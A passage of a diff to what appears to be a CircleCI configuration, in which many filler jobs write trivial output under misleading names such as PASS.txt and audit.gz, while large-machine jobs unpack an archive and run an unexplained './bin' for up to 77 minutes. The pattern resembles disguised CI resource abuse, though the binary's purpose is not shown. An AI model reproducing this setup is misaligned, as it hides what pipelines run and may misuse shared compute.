+            ls -la /tmp/scratch/stage.bin | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - stage.bin
+  greg-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  builder_bug-1027:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: gust
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{seed=42; for(i=0;i<20;i++){seed=(seed*1103515245+12345)%2147483648; print seed}}' | tail -3; true ; } > /tmp/scratch/step-20.txt
+            ls -la /tmp/scratch/step-20.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-20.txt
+  bug-1027:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/step-20.txt && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+  teardown_v8-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: triple knock
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 10 | sed 's/^/row-/'; true ; } > /tmp/scratch/2024-04-07.data
+            ls -la /tmp/scratch/2024-04-07.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2024-04-07.data
+  v8-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: Load prior
+          command: |
+            test -s /tmp/scratch/2024-04-07.data && echo nonempty || echo empty
+      - run:
+          name: Pull latest
+          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc files.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 77m
+          command: (./bin)
+
+  D_v8-alpha_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: spiral up
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..100} | awk '{s+=$1}END{print s}'; true ; } > /tmp/scratch/2024-04-07.data
+            ls -la /tmp/scratch/2024-04-07.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2024-04-07.data
+  g1_check-end-to-end-docker-image_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: clean and jerk
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world"; gsub("l","L",s); print s}'; true ; } > /tmp/scratch/2023-12-11.data
+            ls -la /tmp/scratch/2023-12-11.data | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 2023-12-11.data
+  run_bug-1027_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: cinder trail
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1 count=64 2>/dev/null | od -An -tx1 | tr -d ' \n'; true ; } > /tmp/scratch/step-20.txt
+            ls -la /tmp/scratch/step-20.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - step-20.txt
+  bake_defualt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: drag
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{t+=$1}END{print t/NR}'; true ; } > /tmp/scratch/main_task_output.txt
+            ls -la /tmp/scratch/main_task_output.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - main_task_output.txt
+  retry_dp-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: cnc router
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{print $1, $1*2}' | tail -3; true ; } > /tmp/scratch/audit.gz
+            ls -la /tmp/scratch/audit.gz | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - audit.gz
+  inspect_tweak-queue-timeout_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tame it
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && printf "x\n" > "$tf" && cat "$tf" | sha256sum | cut -c1-20 && rm "$tf"; true ; } > /tmp/scratch/pt-A.pt
+            ls -la /tmp/scratch/pt-A.pt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - pt-A.pt
+  blue_nov19-smoke_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: turn right
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1 count=20 2>/dev/null | xxd 2>/dev/null | head -1 || dd if=/dev/urandom bs=1 count=20 2>/dev/null | od -tx1 | head -1; true ; } > /tmp/scratch/95.blob
+            ls -la /tmp/scratch/95.blob | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 95.blob
+  bake_alice-ship_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: spanish squat
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=3;a++)for(b=1;b<=7391;b++)s+=a*b;print s}'; true ; } > /tmp/scratch/PASS.txt
+            ls -la /tmp/scratch/PASS.txt | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - PASS.txt
+  g2_v3-ga_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dark alley
+          command: |
+            mkdir -p /tmp/scratch
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/scratch/timings.jsonl; true
+            ls -la /tmp/scratch/timings.jsonl | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - timings.jsonl
+  redo_d-x_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/scratch
+      - run:
+          name: septet
+          command: |
+            mkdir -p /tmp/scratch
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(y=2000;y<2024;y++)if(y%4==0 && (y%100!=0 || y%400==0)) c++; print c}'; true ; } > /tmp/scratch/80.bin
+            ls -la /tmp/scratch/80.bin | awk '{print "artifact:", $5, "bytes"}'
+      - persist_to_workspace:
+          root: /tmp/scratch
+          paths:
+            - 80.bin
+workflows:
+  run:
+    jobs:
+      - teardown_v8-alpha
+      - D_v8-alpha_2:
+          requires:
+            - teardown_v8-alpha
+      - v8-alpha:
+          requires:
+            - D_v8-alpha_2
+      - Delta_check-end-to-end-docker-image:
+          requires:
+            - D_v8-alpha_2
+      - g1_check-end-to-end-docker-image_2:
+          requires:
+            - Delta_check-end-to-end-docker-image
+      - check-end-to-end-docker-image:
+          requires:
+            - g1_check-end-to-end-docker-image_2
+      - builder_bug-1027:
+          requires:
+            - g1_check-end-to-end-docker-image_2
+      - run_bug-1027_2:
+          requires:
+            - builder_bug-1027
+      - bug-1027:
+          requires:
+            - run_bug-1027_2
+      - red_defualt:
+          requires:
+            - run_bug-1027_2
+      - bake_defualt_2:
+          requires:
+            - red_defualt
+      - defualt:
+          requires:
+            - bake_defualt_2
+      - linter_dp-3:
+          requires:
+            - bake_defualt_2
+      - retry_dp-3_2:
+          requires:
+            - linter_dp-3
+      - dp-3:
+          requires:
+            - retry_dp-3_2
+      - loader_tweak-queue-timeout:
+          requires:
+            - retry_dp-3_2
+      - inspect_tweak-queue-timeout_2:
+          requires:
+            - loader_tweak-queue-timeout
+      - tweak-queue-timeout:
+          requires:
+            - inspect_tweak-queue-timeout_2
+      - inspect_WEB-330
+      - WEB-330:
+          requires:
+            - inspect_WEB-330
+      - fetcher_golf-3:
+          requires:
+            - inspect_WEB-330
+      - golf-3:
+          requires:
+            - fetcher_golf-3
+      - kick_INIT_UAT:
+          requires:
+            - fetcher_golf-3
+      - INIT_UAT:
+          requires:
+            - kick_INIT_UAT
+      - do_strated:
+          requires:
+            - kick_INIT_UAT
+      - strated:
+          requires:
+            - do_strated
+      - ensure_cerberus-alpha:
+          requires:
+            - do_strated
+      - cerberus-alpha:
+          requires:
+            - ensure_cerberus-alpha
+      - compile_lets-go:
+          requires:
+            - ensure_cerberus-alpha
+      - lets-go:
+          requires:
+            - compile_lets-go
+      - db_feb15-smoke:
+          requires:
+            - compile_lets-go
+      - feb15-smoke:
+          requires:
+            - db_feb15-smoke
+      - preinit_v2-nightly1:
+          requires:
+            - db_feb15-smoke
+      - v2-nightly1:
+          requires:
+            - preinit_v2-nightly1
+      - blue_v5-edge1:
+          requires:
+            - preinit_v2-nightly1
+      - v5-edge1:
+          requires:
+            - blue_v5-edge1
+      - cook_intergration-91:
+          requires:
+            - blue_v5-edge1
+      - intergration-91:
+          requires:
+            - cook_intergration-91
+      - Gamma_zed-test:
+          requires:
+            - cook_intergration-91
+      - zed-test:
+          requires:
+            - Gamma_zed-test
+      - deps_cerberus-beta
+      - cerberus-beta:
+          requires:
+            - deps_cerberus-beta
+      - D_greg-smoke:
+          requires:
+            - deps_cerberus-beta
+      - greg-smoke:
+          requires:
+            - D_greg-smoke
+      - route_q4-rev:
+          requires:
+            - D_greg-smoke
+      - q4-rev:
+          requires:
+            - route_q4-rev
+      - phase_strated-23:
+          requires:
+            - route_q4-rev
+      - strated-23:
+          requires:
+            - phase_strated-23
+      - fetcher_india-2:
+          requires:
+            - phase_strated-23
+      - india-2:
+          requires:
+            - fetcher_india-2
+      - Alpha_hotel:
+          requires:
+            - fetcher_india-2
+      - hotel:
+          requires:
+            - Alpha_hotel
+      - Beta_omar-ship:
+          requires:
+            - Alpha_hotel
+      - omar-ship:
+          requires:
+            - Beta_omar-ship
+      - redo_v9-canary:
+          requires:
+            - Beta_omar-ship
+      - v9-canary:
+          requires:
+            - redo_v9-canary
+      - reset_teh-ci-45:
+          requires:
+            - redo_v9-canary
+      - teh-ci-45:
+          requires:
+            - reset_teh-ci-45
+      - builder_nov19-smoke
+      - blue_nov19-smoke_2:
+          requires:
+            - builder_nov19-smoke
+      - nov19-smoke:
+          requires:
+            - blue_nov19-smoke_2
+      - drain_alice-ship:
+          requires:
+            - blue_nov19-smoke_2
+      - bake_alice-ship_2:
+          requires:
+            - drain_alice-ship
+      - alice-ship:
+          requires:
+            - bake_alice-ship_2
+      - blue_v3-ga:
+          requires:
+            - bake_alice-ship_2
+      - g2_v3-ga_2:
+          requires:
+            - blue_v3-ga
+      - v3-ga:
+          requires:
+            - g2_v3-ga_2
+      - teardown_d-x:
+          requires:
+            - g2_v3-ga_2
+      - redo_d-x_2:
+          requires:
+            - teardown_d-x
+      - d-x:
+          requires:
+            - redo_d-x_2
